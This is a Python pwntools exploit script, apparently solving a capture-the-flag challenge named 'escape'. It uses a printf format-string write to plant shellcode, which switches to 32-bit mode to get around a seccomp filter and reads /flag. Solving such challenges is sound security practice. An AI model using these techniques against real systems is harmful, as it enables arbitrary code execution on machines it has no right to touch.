#!/usr/bin/python3

# import os
# os.environ['PWNLIB_NOTERM'] = 'True'  # Configuration patch to allow pwntools to be run inside of an IDE
from pwn import *

LOG_LEVEL = "info"
DEBUG = False

context.log_level = LOG_LEVEL
context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"

def generate_shellcode_noseccomp(addr):
    shellcode = shellcraft.linux.cat('flag.txt')
    return asm(shellcode)

def generate_shellcode(addr):
    # pivot stack to our segment
    stack_addr = (addr & 0xFFFF0000) + 0x0F00
    #
    shellcode = f"""
.intel_syntax noprefix
.code64
.globl i386_shellcode

    call $+5
    pop rax  /* get rip */
    add rax, 0x14 /* offset from $ to .i386_shellcode */
    mov rsi, 0x2300000000
    xor rax, rsi
    push rax
    retfd

.i386_shellcode:
    /* pivot stack */
    mov esp, {hex(stack_addr)}
    /* open */
    mov eax, 0x5 /* syscall */
    push 0x67 /** 'g\x00' **/
    push 0x616c662f /** '/fla' **/
    mov ebx, esp /* filename */
    xor ecx, ecx /* mode */
    xor edx, edx /* flags */
    int 0x80
    /* read */
    mov ebx, eax /* fd */
    mov eax, 3 /* syscall */
    sub esp, 0x40
    mov ecx, esp /* buffer */
    mov edx, 0x40 /* count */
    int 0x80
    /* write */
    mov eax, 4 /* syscall */
    mov ebx, 1 /* fd */
    int 0x80
"""
    shellcode_binary = asm(shellcode)
    return shellcode_binary

def generate_shellcode_bad(addr):
    shellcode = shellcraft.linux.cat("/flag")
    shellcode_binary = asm(shellcode)
    return shellcode_binary

def main(binary):
    if DEBUG:
        p = process(binary)
        # replace break with your `call rax` address (shellcode entry)
        gdb.attach(p, '''
    set follow-fork-mode child
    b *0x0401B91
    continue
    ''')
        sleep(2)
    else:
        p = remote("127.0.0.1", 5051)

    jit_addr = 0x50510000

    def exec_fmt(payload):
        # skip invitation
        p.recvuntil(b"Enter: \n")
        p.sendline(payload)
        p.recvuntil(b"Entered: ")
        val = p.recvline().strip()
        debug(val.decode('utf8'))
        return val
    
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    # success(f"Found printf offset: {offset}")

    info(f"Transfering shellcode")
    shellcode = generate_shellcode(jit_addr) 
    # shellcode = generate_shellcode_bad(jit_addr) 
    debug(shellcode.hex())

    # transfer shellcode to remote
    cur_addr = jit_addr + 20 # offset a bit to prevent \n emerging in payload
    while len(shellcode):
        cur_value, shellcode = shellcode[:4], shellcode[4:]
        cur_value = unpack(cur_value.ljust(4, b'\x90'), 32) # pad value with nops (0x90)
        # write value through printf
        p.recvuntil(b"Enter: \n")
        payload = fmtstr_payload(offset, {cur_addr: cur_value})
        debug(f"{cur_addr:16x}: {cur_value:16x} ({payload})")
        p.sendline(payload)
        # next addr
        cur_addr += 4
    
    # exec shellcode
    p.recvuntil(b"Enter: \n")
    p.sendline(b"done")
    
    # get flag
    success(f"Flag: {p.readline(False).decode('utf8')}")
    # p.interactive()

if __name__ == "__main__":
    main("./escape")
